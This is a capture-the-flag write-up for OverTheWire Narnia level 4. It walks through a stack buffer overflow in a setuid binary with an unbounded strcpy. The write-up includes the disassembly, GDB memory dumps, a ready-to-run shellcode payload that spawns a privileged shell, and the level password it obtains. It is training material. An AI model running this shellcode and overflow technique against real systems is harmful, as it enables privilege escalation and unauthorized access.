## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BinaryExploitation #BufferOverflow
**Completion Date & Time :** 2026 - 02 - 11 / 20:58

---
## FLAG : `4VhyE9TRcd`

---
## Solution :

### Step 1 :  Check for `narnia4.c` file
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

Look at this part :
```c
for(i = 0; environ[i] != NULL; i++)
	memset(environ[i], '\0', strlen(environ[i]));

```
This loop will reset all environment variable values. Actually this will prevent us to replace/create environment variable with something (like shell code). In previous challenge ([[Narnia (2 -> 3)]]), we use shell injection method, but we place the `shell` inside the stack directly, not inside an environment variable. We actually can inject shell inside `environment variable` like [[Narnia (1 -> 2)]], then we call it by modifying `return address`.

In this challenge, it just prevent us using environment variable method, so we could just use the method as in [[Narnia (2 -> 3)]] to solve this challenge.
### Step 2 : Check for binary file
```asm
   0x08049186 <+0> :	push   ebp
   0x08049187 <+1> :	mov    ebp,esp
   0x08049189 <+3> :	sub    esp,0x104
   0x0804918f <+9> :	mov    DWORD PTR [ebp-0x4],0x0
   0x08049196 <+16>:	jmp    0x80491d0 <main+74>
   0x08049198 <+18>:	mov    eax,ds:0x804b1ec
   0x0804919d <+23>:	mov    edx,DWORD PTR [ebp-0x4]
   0x080491a0 <+26>:	shl    edx,0x2
   0x080491a3 <+29>:	add    eax,edx
   0x080491a5 <+31>:	mov    eax,DWORD PTR [eax]
   0x080491a7 <+33>:	push   eax
   0x080491a8 <+34>:	call   0x8049050 <strlen@plt>
   0x080491ad <+39>:	add    esp,0x4
   0x080491b0 <+42>:	mov    edx,DWORD PTR ds:0x804b1ec
   0x080491b6 <+48>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080491b9 <+51>:	shl    ecx,0x2
   0x080491bc <+54>:	add    edx,ecx
   0x080491be <+56>:	mov    edx,DWORD PTR [edx]
   0x080491c0 <+58>:	push   eax
   0x080491c1 <+59>:	push   0x0
   0x080491c3 <+61>:	push   edx
   0x080491c4 <+62>:	call   0x8049060 <memset@plt>
   0x080491c9 <+67>:	add    esp,0xc
   0x080491cc <+70>:	add    DWORD PTR [ebp-0x4],0x1
   0x080491d0 <+74>:	mov    eax,ds:0x804b1ec
   0x080491d5 <+79>:	mov    edx,DWORD PTR [ebp-0x4]
   0x080491d8 <+82>:	shl    edx,0x2
   0x080491db <+85>:	add    eax,edx
   0x080491dd <+87>:	mov    eax,DWORD PTR [eax]
   0x080491df <+89>:	test   eax,eax
   0x080491e1 <+91>:	jne    0x8049198 <main+18>
   0x080491e3 <+93>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x080491e7 <+97>:	jle    0x8049201 <main+123>
   0x080491e9 <+99>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080491ec <+102>:	add    eax,0x4
   0x080491ef <+105>:	mov    eax,DWORD PTR [eax]
   0x080491f1 <+107>:	push   eax
   0x080491f2 <+108>:	lea    eax,[ebp-0x104]
   0x080491f8 <+114>:	push   eax
   0x080491f9 <+115>:	call   0x8049040 <strcpy@plt>
   0x080491fe <+120>:	add    esp,0x8
   0x08049201 <+123>:	mov    eax,0x0
   0x08049206 <+128>:	leave
   0x08049207 <+129>:	ret
```

Put a break in `main+120`. Since buffer takes 256 bytes, lets run with a 256 bytes length string.
```bash
perl -e 'print "A"x256'
```

Here is the result :
```shell
0xffffd16c:	0xffffd174	0xffffd4b4	0x41414141	0x41414141
0xffffd17c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd18c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd19c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1ac:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1bc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1cc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1dc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1ec:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd1fc:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd20c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd21c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd22c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd23c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd24c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd25c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd26c:	0x41414141	0x41414141	0x00000000	0x00000000
0xffffd27c:	0xf7da1cb9	0x00000002	0xffffd334	0xffffd340
0xffffd28c:	0xffffd2a0	0xf7fade34	0x0804909d	0x00000002
```

Also put a break on `ret` and check for `$esp` registers to find the `return address`
```asm
gef➤  x/x $esp
0xffffd27c:	0xf7da1cb9
```

Let's use `ltrace` to find the address of `buffer` with smaller overhead :
```bash
ltrace /narnia/narnia4 $(perl -e 'print "A"x256')
#Result :
strcpy(0xffffd194, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)       = 0xffffd194
```
We've found the address of `buffer`, which is `0xffffd194`.
Based on all information above, we know that right after `buffer`, the program have 8 bytes padding before the return address.

### Step 3 : Payload Setup
Here is the payload
```
[222 Bytes NOP Sled] + [34 Bytes Shell Code] + [8 Bytes NOP Sled] + [Address Between First NOP Sled]
```

```bash
perl -e 'print "A"x222 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "B"x8 . "\xA4\xd1\xff\xff"'
```

### Step 4 : Execute 
Execute this :
```bash
/narnia/narnia4 $(perl -e 'print "A"x222 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "B"x8 . "\xA4\xd1\xff\xff"')
```
And here is the result :
```shell
narnia4@narnia:/narnia$ /narnia/narnia4 $(perl -e 'print "A"x222 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" . "B"x8 . "\xA4\xd1\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
4VhyE9TRcd
```

---
### Key Takeaways : 
- This level is same as [[Narnia (2 -> 3)]], to view the full explaination, please visit that site.

---
## Related Concepts : 
[[SetUID Files]], [[System Calls]], [[Narnia (2 -> 3)]], [[perl]], [[ltrace]], 

---
## Next Challenge :
[[Narnia (5 -> 6)]]